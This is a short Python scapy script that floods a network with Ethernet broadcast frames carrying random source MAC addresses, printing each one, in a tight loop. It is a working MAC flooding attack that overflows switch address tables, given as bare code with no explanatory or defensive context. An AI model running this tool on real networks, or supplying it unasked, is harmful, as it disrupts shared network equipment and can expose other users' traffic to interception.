
import random
import time

from scapy.all import *

try:
    dst = ':'.join(['ff'] * 6)
    while True:
        src = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
        print(src, '>', dst)
        sendp(Ether(src=src, dst=dst), verbose=False)
        time.sleep(0.003)
except KeyboardInterrupt:
    pass
